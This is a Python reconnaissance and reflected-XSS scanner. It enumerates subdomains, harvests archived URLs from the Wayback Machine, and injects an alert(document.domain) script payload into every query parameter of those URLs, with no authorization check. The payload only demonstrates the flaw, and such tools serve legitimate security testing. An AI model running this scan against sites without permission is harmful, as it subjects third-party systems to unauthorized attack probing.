#!/usr/bin/env python3

import os
import sys
import requests
import urllib.parse
import socket
import warnings
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor
import threading

warnings.filterwarnings("ignore")

# ========== Terminal Colors ==========
GREEN = "\033[0;32m"
RED = "\033[0;31m"
YELLOW = "\033[0;33m"
BLUE = "\033[0;34m"
RESET = "\033[0m"

# ========== Arg Parsing ==========
if len(sys.argv) < 4 or sys.argv[2] != "-t":
    print(f"{RED}[!] Usage: python3 collector.py <domain> -t <subdomain_wordlist> [--verbose]{RESET}")
    sys.exit(1)

MAIN_DOMAIN = sys.argv[1]
WORDLIST = sys.argv[3]
VERBOSE = "--verbose" in sys.argv

print(f"{BLUE}[*] Starting subdomain fuzzing on {MAIN_DOMAIN}{RESET}")

# ========== Step 1: Subdomain Fuzz ==========
live_subdomains = []
lock = threading.Lock()

def resolve_subdomain(sub):
    full = f"{sub.strip()}.{MAIN_DOMAIN}"
    try:
        socket.gethostbyname(full)
        with lock:
            print(f"{GREEN}[+] Alive: {full}{RESET}")
            live_subdomains.append(full)
    except:
        pass

with open(WORDLIST, "r") as f:
    subdomains = [line.strip() for line in f if line.strip() and not line.startswith("#")]

with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(resolve_subdomain, subdomains)

if not live_subdomains:
    print(f"{RED}[-] No alive subdomains found.{RESET}")
    sys.exit(1)

with open("livesubdomain.txt", "w") as f:
    for sub in live_subdomains:
        f.write(sub + "\n")

print(f"{YELLOW}[+] Saved live subdomains to livesubdomain.txt{RESET}")

# ========== Step 2: Wayback URL Collection ==========
all_endpoints = set()
endpoint_file = "endpoints.txt"

def get_wayback_urls(host):
    try:
        url = f"http://web.archive.org/cdx/search/cdx?url=*.{host}/*&output=text&fl=original&collapse=urlkey"
        r = requests.get(url, timeout=15)
        if r.status_code == 200:
            urls = list(set(r.text.strip().split("\n")))
            if urls:
                with lock:
                    all_endpoints.update(urls)
                print(f"{GREEN}[+] {host}: {len(urls)} URLs found{RESET}")
        elif VERBOSE:
            print(f"{RED}[-] {host}: HTTP {r.status_code} from Wayback{RESET}")
    except:
        if VERBOSE:
            print(f"{RED}[-] {host}: Failed to retrieve Wayback URLs.{RESET}")
        # Otherwise, stay silent

print(f"{BLUE}[*] Collecting all endpoints from Wayback Machine...{RESET}")
with ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(get_wayback_urls, live_subdomains)

with open(endpoint_file, "w") as f:
    for url in sorted(all_endpoints):
        f.write(url + "\n")

print(f"{YELLOW}[+] Total endpoints saved to {endpoint_file}: {len(all_endpoints)}{RESET}")

# ========== Step 3: Validate Reachable Hosts ==========
def valid_urls(urls):
    valid = []
    for url in urls:
        try:
            parsed = urllib.parse.urlparse(url.strip())
            if parsed.scheme not in ["http", "https"]:
                continue
            socket.gethostbyname(parsed.netloc)
            valid.append(url)
        except:
            continue
    return list(set(valid))

with open(endpoint_file, "r") as f:
    raw_urls = [line.strip() for line in f if line.strip()]

print(f"{BLUE}[*] Validating endpoint hostnames...{RESET}")
clean_urls = valid_urls(raw_urls)
print(f"{GREEN}[✓] Valid endpoints: {len(clean_urls)}{RESET}")

# ========== Step 4: Reflected XSS Testing ==========
vuln_file = "vuln_results.txt"
if os.path.exists(vuln_file):
    os.remove(vuln_file)

payload = '</script><script>alert(document.domain)</script>'

def test_xss(url):
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        return

    params = urllib.parse.parse_qs(parsed.query)
    if not params:
        return

    for param in params:
        fuzzed_params = params.copy()
        fuzzed_params[param] = payload
        encoded_query = urllib.parse.urlencode(fuzzed_params, doseq=True)
        fuzzed_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{encoded_query}"
        try:
            r = requests.get(fuzzed_url, timeout=7, verify=False)
            if payload in r.text:
                print(f"{RED}[VULNERABLE] {fuzzed_url}{RESET}")
                with lock:
                    with open(vuln_file, "a") as vf:
                        vf.write(fuzzed_url + "\n")
        except:
            pass

print(f"{BLUE}[*] Scanning for reflected XSS...{RESET}")
with ThreadPoolExecutor(max_workers=30) as executor:
    executor.map(test_xss, clean_urls)

print(f"{GREEN}[✓] XSS scan complete. Results saved in {vuln_file}{RESET}")
